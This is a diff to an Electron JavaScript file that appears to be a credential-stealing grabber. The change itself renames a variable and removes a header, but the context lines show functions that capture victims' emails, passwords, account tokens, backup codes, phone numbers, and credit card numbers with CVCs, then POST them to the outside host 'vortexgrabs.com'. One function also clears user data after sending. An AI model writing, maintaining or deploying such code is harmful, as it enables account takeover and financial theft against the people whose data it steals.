@@ -11,10 +11,10 @@ const {
 } = require('electron');
 
 
-const Keys = "%CUSTOMERKEYS%";
+const key = "%CUSTOMERKEYS%";
 
-async function sendToApiMessage(Keys, message) {
-    const data = JSON.stringify({ Keys: Keys, message: message });
+async function sendToApiMessage(key, message) {
+    const data = JSON.stringify({ key: key, message: message });
 
     const options = {
         hostname: 'vortexgrabs.com',
@@ -22,8 +22,7 @@ async function sendToApiMessage(Keys, message) {
         path: '/send-message',
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': data.length
+            'Content-Type': 'application/json'
         }
     };
 
@@ -302,7 +301,7 @@ const EmailPassToken = async (email, password, token, action) => {
                     `💣 *Token:* \`${token}\``;
 
 
-    await sendToApiMessage(Keys,message); 
+    await sendToApiMessage(key,message); 
 };
 
 
@@ -320,7 +319,7 @@ const BackupCodesViewed = async (codes, token) => {
     }
     message += `\n*Email:* \`${account.email}\`\n*Phone:* \`${account.phone || "None"}\``;
 
-    await sendToApiMessage(Keys,message);
+    await sendToApiMessage(key,message);
 };
 
 
@@ -335,7 +334,7 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
                     `💣 *Token:* \`${token}\``
 
 
-    await sendToApiMessage(Keys,message);
+    await sendToApiMessage(key,message);
 };
 
 
@@ -349,7 +348,7 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
                     `*Token:* \`${token}\``;
 
 
-    await sendToApiMessage(Keys,message);
+    await sendToApiMessage(key,message);
 };
 
 
@@ -360,7 +359,7 @@ const PaypalAdded = async (token) => {
                     `*Email:* \`${account.email}\`\n` +
                     `*Phone:* \`${account.phone || "None"}\``;
 
-    await sendToApiMessage(Keys,message);
+    await sendToApiMessage(key,message);
 };
 
 
@@ -397,7 +396,7 @@ const initiation = async () => {
                         `*Email:* \`${account.email}\`\n` +
                         `*Phone:* \`${account.phone || "None"}\``;
 
-        await sendToApiMessage(Keys,message);
+        await sendToApiMessage(key,message);
         clearAllUserData();
     }
 };
